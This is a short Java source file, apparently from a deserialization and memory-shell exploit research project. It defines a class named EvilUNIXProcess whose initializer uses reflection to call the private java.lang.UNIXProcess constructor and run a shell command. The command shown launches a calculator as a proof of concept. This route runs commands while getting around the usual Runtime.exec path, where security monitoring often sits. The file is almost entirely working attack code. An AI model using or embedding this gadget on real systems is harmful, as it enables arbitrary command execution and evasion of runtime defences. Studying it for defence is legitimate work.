package xyz.eki.marshalexp.memshell;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

public class EvilUNIXProcess {
    {
        String cmd = "mate-calc";
        Class<?> UnixProcess = null;
        try {
            UnixProcess = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        Constructor<?> constructor = UnixProcess.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        byte[] argBlock = String.format("-c\00%s",cmd).getBytes();
        try {
            Object o = constructor.newInstance("/bin/sh".getBytes(),
                    argBlock, argBlock.length,
                    null, 0,
                    null,
                    new int[]{-1, -1, -1},
                    false
            );
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }
}
